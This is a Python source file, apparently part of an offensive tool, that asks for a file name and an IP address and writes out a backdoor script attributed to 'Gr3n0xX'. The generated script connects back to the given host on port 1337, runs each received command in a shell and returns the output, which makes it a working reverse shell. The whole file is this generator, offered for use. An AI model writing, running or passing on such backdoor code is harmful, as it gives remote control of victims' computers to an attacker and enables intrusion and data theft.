
from src.message import success, error, warn

def pyload():
    file_name = input("[?] Insert a file name (example: bigbackdoor.py): ")
    ip = input("[?] Insert your IP: ")

    arq = open(file_name, 'w')

    temp = """
# Backdoor by: Gr3n0xX
# Python 3.9

import socket
import subprocess
import os
import sys

LHOST = '""" + ip + """' 
LPORT = 1337
client = socket.socket()
print("[-] Connection Initiating...")

try:
    client.connect((LHOST, LPORT))
    print("[-] Connection initiated!")
    
except ConnectionAbortedError:
    os.system("clear")
    print("[!] Connection aborted, check IpAddres or see if the port you selected is open...")
    sys.exit()
    
except ConnectionRefusedError:
    os.system("clear")
    print("[!] Connection refused, check IpAddres or see if the port you selected is open...")
    sys.exit()
    
except TimeoutError:
    os.system("clear")
    print("[!] Connection refused")
    sys.exit()

except KeyboardInterrupt:
    os.system("clear")
    print("[!] Shutdown")
    sys.exit()

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
    """
    arq.write(temp + "\n")
    finish(ip)

def finish(ip):
    warn("Generating, please wait...\n")
    
    success("Finished backdoor.")
    success(f"Backdoor IP: {ip} - Backdoor Port: 1337")

